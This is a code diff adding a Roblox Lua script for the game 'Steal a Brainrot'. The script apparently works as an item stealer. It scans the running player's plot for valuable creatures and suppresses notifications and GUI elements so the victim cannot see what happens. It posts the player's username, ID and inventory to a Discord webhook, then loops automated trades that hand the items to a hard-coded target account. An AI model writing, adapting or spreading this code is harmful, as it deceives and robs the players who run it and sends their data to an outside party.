+    ["La Supreme Combinasion"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Cerberus"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Capitano Moby"] = true,
+    ["Cooki and Milki"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Ketupat Bros"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Signore Carapace"] = true,
+    ["La Casa Boo"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["La Food Combinasion"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Ginger Gerat"] = true,
+    ["Festive 67"] = true,
+    ["Antonio"] = true,
+    ["Garama and Madundung"] = true,
+    ["La Secret Combinasion"] = true
+}
+
+local GOOD_BRAINROTS = {
+    ["Foxini Lanternini"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Los Amigos"] = true,
+    ["Los Sekolahs"] = true,
+    ["Cloverat Clapat"] = true,
+    ["Chillin Chili"] = true,
+    ["Fragola La La La"] = true,
+    ["Cash or Card"] = true,
+    ["Hydra Bunny"] = true,
+    ["Bunny and Eggy"] = true,
+    ["Arcadragon"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Los Chillis"] = true,
+    ["Kalika Bros"] = true,
+    ["Digi Narwhal"] = true,
+    ["Gym Bros"] = true,
+    ["Globa Steppa"] = true,
+    ["Dug dug dug"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Fishino Clownino"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Headless Horseman"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Love Love Bear"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Cerberus"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Capitano Moby"] = true,
+    ["Cooki and Milki"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Ketupat Bros"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Signore Carapace"] = true,
+    ["La Casa Boo"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["La Food Combinasion"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Ginger Gerat"] = true,
+    ["Festive 67"] = true,
+    ["Antonio"] = true,
+    ["Garama and Madundung"] = true
+}
+
+local function getRemote(unobfuscatedName)
+    local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
+    local children = Net:GetChildren()
+    for i = 1, #children - 1 do
+        local current = children[i]
+        local nextFolder = children[i + 1]
+        if current and nextFolder and string.find(current.Name, unobfuscatedName) then
+            return nextFolder
+        end
+    end
+    return nil
+end
+
+local function applyEverythingAfterTargetFound()
+    local leftCenter = pg:FindFirstChild("LeftCenter")
+    if leftCenter then
+        local clone = leftCenter:Clone()
+        clone.Name = "LeftCenter_Backup"
+        clone.Parent = pg
+        leftCenter:Destroy()
+    end
+
+    local notifyRemote = getRemote("RE/NotificationService/Notify")
+    if notifyRemote then
+        pcall(function()
+            for _, connection in ipairs(getconnections(notifyRemote.OnClientEvent)) do
+                connection:Disable()
+            end
+        end)
+    end
+
+    local function handleCam(obj)
+        if obj:IsA("BlurEffect") then task.defer(function() obj:Destroy() end) end
+    end
+    cam.ChildAdded:Connect(handleCam)
+    for _, v in ipairs(cam:GetChildren()) do handleCam(v) end
+
+    cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
+        cam.FieldOfView = 70
+    end)
+    cam.FieldOfView = 70
+
+    local function handleGui(obj)
+        if guiNames[obj.Name] then task.defer(function() obj:Destroy() end) end
+    end
+    pg.ChildAdded:Connect(handleGui)
+    for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
+end
+
+local AnimalsData, AnimalsShared, NumberUtils
+pcall(function()
+    AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
+    AnimalsShared = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
+    NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
+end)
+
+local function loadSyncData()
+    local mod = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
+    if not mod then return nil end
+    local sync = require(mod)
+    local fn = sync.Get
+    for i = 1, 15 do
+        local s, v = pcall(debug.getupvalue, fn, i)
+        if s and type(v) == "table" then return v end
+    end
+    return nil
+end
+
+local SYNC_DATA = loadSyncData()
+if not SYNC_DATA then return end
+
+local brainrotQueue = {}
+for _, plotData in pairs(SYNC_DATA) do
+    if type(plotData) == "table" then
+        local owner = plotData.Owner or (type(plotData.Get) == "function" and plotData:Get("Owner"))
+        if (typeof(owner) == "Instance" and owner == LP) or (typeof(owner) == "table" and owner.UserId == LP.UserId) then
+            local animalList = plotData.AnimalList or (type(plotData.Get) == "function" and plotData:Get("AnimalList"))
+            if type(animalList) == "table" then
+                for slotKey, data in pairs(animalList) do
+                    if type(data) == "table" and data.Index and TargetBrainrots[data.Index] then
+                        table.insert(brainrotQueue, {slotKey = tonumber(slotKey), data = data})
+                    end
+                end
+            end
+        end
+    end
+end
+
+if #brainrotQueue == 0 then return end
+
+applyEverythingAfterTargetFound()
+
+local function formatNumber(n)
+    if not n then return "$0/s" end
+    local function clean(s) return s:gsub("%.?0+$", "") end
+    if n >= 1e12 then return "$" .. clean(string.format("%.2f", n/1e12)) .. "T/s" end
+    if n >= 1e9  then return "$" .. clean(string.format("%.2f", n/1e9))  .. "B/s" end
+    if n >= 1e6  then return "$" .. clean(string.format("%.2f", n/1e6))  .. "M/s" end
+    if n >= 1e3  then return "$" .. clean(string.format("%.2f", n/1e3))  .. "K/s" end
+    return "$" .. tostring(math.floor(n)) .. "/s"
+end
+
+local function getRequestFn()
+    return (syn and syn.request) or (http and http.request) or http_request or request
+end
+
+local function toWikiName(displayName)
+    local clean = displayName:match("^(.-)%s*%(") or displayName
+    return clean:gsub(" ", "_")
+end
+
+local function fetchFandomImageUrl(displayName)
+    local requestFn = getRequestFn()
+    if not requestFn then return nil end
+
+    local wikiName = toWikiName(displayName)
+    local url = FANDOM_BASE .. wikiName
+
+    for attempt = 1, 3 do
+        local ok, response = pcall(function()
+            return requestFn({
+                Url = url,
+                Method = "GET",
+                Headers = {
+                    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    ["Accept-Language"] = "en-US,en;q=0.5",
+                    ["Cache-Control"] = "no-cache"
+                },
+                Timeout = 10
+            })
+        end)
+
+        if ok and response and response.StatusCode and response.StatusCode == 200 then
+            local body = response.Body
+            if not body or body == "" then
+                if attempt < 3 then task.wait(0.5) end
+                continue
+            end
+
+            local ogImage = body:match('property="og:image"%s+content="([^"]+)"')
+                or body:match('content="([^"]+)"%s+property="og:image"')
+                or body:match('<meta%s+og:image%s+content="([^"]+)"')
+                or body:match('<meta%s+property="og:image"%s+content="([^"]+)"')
+
+            if ogImage and ogImage ~= "" then
+                ogImage = ogImage:gsub("&amp;", "&"):gsub("&quot;", '"'):gsub("&lt;", "<"):gsub("&gt;", ">")
+                if ogImage:find("^https?://") then
+                    return ogImage
+                end
+            end
+
+            local infoboxPattern = '<div[^>]*class="[^"]*infobox[^"]*"[^>]*>(.-)</div>%s*</div>'
+            local infoboxMatch = body:match(infoboxPattern)
+            local searchBody = infoboxMatch or body
+
+            local imgPatterns = {
+                'data%-src="(https://[^"]+%.(?:png|jpg|jpeg|webp|gif))"',
+                'src="(https://[^"]+%.(?:png|jpg|jpeg|webp|gif))"',
+            }
+
+            for _, pattern in ipairs(imgPatterns) do
+                local lastMatch = nil
+                local pos = 1
+                while true do
+                    local start, endPos = searchBody:find(pattern, pos)
+                    if not start then break end
+                    local match = searchBody:sub(start, endPos)
+                    local url = match:match('"([^"]+)"')
+
+                    if url and url:find("static%.wikia%.nocookie%.net") then
+                        if not url:find("/scale%-to%-width%-down/[0-9]?[0-9]$") then
+                            lastMatch = url
+                        end
+                    elseif url then
+                        lastMatch = url
+                    end
+                    pos = endPos + 1
+                end
+
+                if lastMatch then
+                    lastMatch = lastMatch:gsub("/revision/latest", "")
+                    return lastMatch
+                end
+            end
+
+            return nil
+        end
+
+        if attempt < 3 then
+            task.wait(0.5 * attempt)
+        end
+    end
+
+    return nil
+end
+
+local function getBrainrotColor(animalIndex)
+    local color = nil
+    pcall(function()
+        local models = ReplicatedStorage:FindFirstChild("Models")
+        local animals = models and models:FindFirstChild("Animals")
+        if not animals then return end
+        local template = animals:FindFirstChild(animalIndex)
+        if not template then
+            local info = AnimalsData and AnimalsData[animalIndex]
+            if info and info.DisplayName then
+                template = animals:FindFirstChild(info.DisplayName)
+            end
+        end
+        if not template then return end
+        local bestScore = 0
+        for _, desc in ipairs(template:GetDescendants()) do
+            if desc:IsA("MeshPart") or desc:IsA("Part") then
+                local c = desc.Color
+                local vol = desc.Size.X * desc.Size.Y * desc.Size.Z
+                local maxC = math.max(c.R, c.G, c.B)
+                local minC = math.min(c.R, c.G, c.B)
+                local sat = (maxC > 0) and ((maxC - minC) / maxC) or 0
+                local bri = c.R * 0.299 + c.G * 0.587 + c.B * 0.114
+                local bp = 1
+                if bri < 0.08 then bp = 0.05 end
+                if bri > 0.92 then bp = 0.15 end
+                local score = (sat * 3 + 0.2) * bp * vol
+                if score > bestScore then
+                    bestScore = score
+                    color = c
+                end
+            end
+        end
+    end)
+    return color
+end
+
+local function colorToDecimal(c)
+    if not c then return 3447003 end
+    local r = math.clamp(math.floor(c.R * 255), 0, 255)
+    local g = math.clamp(math.floor(c.G * 255), 0, 255)
+    local b = math.clamp(math.floor(c.B * 255), 0, 255)
+    return r * 65536 + g * 256 + b
+end
+
+local function getBestImageUrl(displayName, animalIndex)
+    local fandom = fetchFandomImageUrl(displayName)
+    if fandom then return fandom end
+    local info = AnimalsData and AnimalsData[animalIndex]
+    if info then
+        for _, key in ipairs({"Image","Icon","Thumbnail","Texture","ImageId","AssetId","image","icon"}) do
+            if info[key] and type(info[key]) == "string" and info[key] ~= "" then
+                local num = info[key]:match("%d+")
+                if num then
+                    return "https://tr.rbxcdn.com/" .. num .. "/420/420/Image/Png"
+                end
+            end
+        end
+    end
+    if animalIndex and animalIndex ~= displayName then
+        local fandom2 = fetchFandomImageUrl(animalIndex)
+        if fandom2 then return fandom2 end
+    end
+    return nil
+end
+
+local function sendDetailedWebhook()
+    local resultsPrimary = {}
+    local requirePingPrimary = false
+
+    for _, plotData in pairs(SYNC_DATA) do
+        if type(plotData) == "table" then
+            local owner = plotData.Owner or (type(plotData.Get) == "function" and plotData:Get("Owner"))
+            if (typeof(owner) == "Instance" and owner == LP) or (typeof(owner) == "table" and owner.UserId == LP.UserId) then
+                local animalList = plotData.AnimalList or (type(plotData.Get) == "function" and plotData:Get("AnimalList"))
+                if type(animalList) == "table" then
+                    for slot, data in pairs(animalList) do
+                        if type(data) == "table" and data.Index then
+                            local info = AnimalsData and AnimalsData[data.Index]
+                            if info then
+                                local displayName = info.DisplayName or data.Index
+                                local isPrimary = (GOOD_BRAINROTS[displayName] ~= nil)
+
+                                if isPrimary then
+                                    local mutation = data.Mutation or "None"
+                                    local traits = (data.Traits and #data.Traits > 0) and data.Traits or {}
+
+                                    if GOOD_BRAINROTS[displayName] == true then
+                                        requirePingPrimary = true
+                                    end
+
+                                    local genVal = 0
+                                    pcall(function()
+                                        genVal = AnimalsShared:GetGeneration(data.Index, data.Mutation, data.Traits, nil)
+                                    end)
+                                    local genStr = formatNumber(genVal)
+
+                                    local mutPrefix = ""
+                                    if mutation ~= "None" and mutation ~= "" then
+                                        mutPrefix = "[" .. mutation .. "] "
+                                    end
+                                    local nameDisplay = mutPrefix .. "**" .. displayName .. "**"
+                                    if #traits > 0 then
+                                        nameDisplay = nameDisplay .. " *(x" .. #traits .. " traits)*"
+                                    end
+
+                                    table.insert(resultsPrimary, {
+                                        slot        = tostring(slot),
+                                        index       = data.Index,
+                                        displayName = displayName,
+                                        name        = nameDisplay,
+                                        genVal      = genVal,
+                                        genStr      = genStr,
+                                    })
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    local function sendToWebhook(resultsList, webhookUrl, ping, avatarUrl)
+        if #resultsList == 0 then return end
+        table.sort(resultsList, function(a, b) return a.genVal > b.genVal end)
+
+        local requestFn = getRequestFn()
+        if not requestFn then return end
+
+        local top = resultsList[1]
+        local imageUrl = getBestImageUrl(top.displayName, top.index)
+        local topColor = getBrainrotColor(top.index)
+        local embedColor = colorToDecimal(topColor)
+
+        local lines = {}
+        for i, r in ipairs(resultsList) do
+            lines[i] = r.name .. " — **" .. r.genStr .. "**"
+        end
+        local listText = table.concat(lines, "\n")
+        if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end
+
+        local unixTime = os.time()
+        local pCount = #Players:GetPlayers()
+        local execName = "Unknown"
+        pcall(function()
+            if identifyexecutor then
+                execName = identifyexecutor()
+            elseif getexecutorname then
+                execName = getexecutorname()
+            end
+        end)
+
+        local embed = {
+            title       = top.displayName .. " — " .. top.genStr,
+            description = listText,
+            color       = embedColor,
+            fields      = {
+                {
+                    name   = "Server",
+                    value  = "Players: **" .. pCount .. "** | Scanned: <t:" .. unixTime .. ":R>",
+                    inline = true
+                },
+                {
+                    name   = "Executor",
+                    value  = execName,
+                    inline = true
+                }
+            },
+            footer      = { text = LP.Name .. " • " .. LP.UserId },
+            timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        }
+
+        if imageUrl then
+            embed.thumbnail = { url = imageUrl }
+        end
+
+        local payloadData = {
+            embeds     = { embed },
+            username   = "Scanner",
+            avatar_url = avatarUrl,
+        }
+
+        if ping then
+            payloadData.content = "||@everyone||"
+        end
+
+        local payload = HttpService:JSONEncode(payloadData)
+
+        pcall(function()
+            requestFn({
+                Url     = webhookUrl,
+                Method  = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body    = payload,
+            })
+        end)
+    end
+
+    sendToWebhook(resultsPrimary, GOOD_WEBHOOK, requirePingPrimary, GOOD_AVATAR)
+end
+
+local function startFullAutomation()
+    local inviteRemote = getRemote("TradeService/Invite")
+    local addRemote    = getRemote("TradeService/AddBrainrot")
+    local readyRemote  = getRemote("TradeService/Ready")
+    local acceptRemote = getRemote("TradeService/Accept")
+
+    if not (inviteRemote and addRemote and readyRemote and acceptRemote) then return end
+
+    task.spawn(function()
+        local idx = 1
+        while true do
+            local item = brainrotQueue[idx]
+            if item then
+                pcall(function() addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data) end)
+                idx = (idx % #brainrotQueue) + 1
+            end
+            task.wait(DELAY_STEP)
+        end
+    end)
+
+    task.spawn(function()
+        while true do
+            pcall(function() inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID) end)
+            task.wait(TRADE_CYCLE_DELAY)
+        end
+    end)
+
+    task.spawn(function()
+        while true do
+            pcall(function() readyRemote:FireServer(READY_GUID) end)
+            task.wait(1)
+            pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
+            task.wait(1)
+        end
+    end)
+end
+
+sendDetailedWebhook()
+startFullAutomation()
+end)
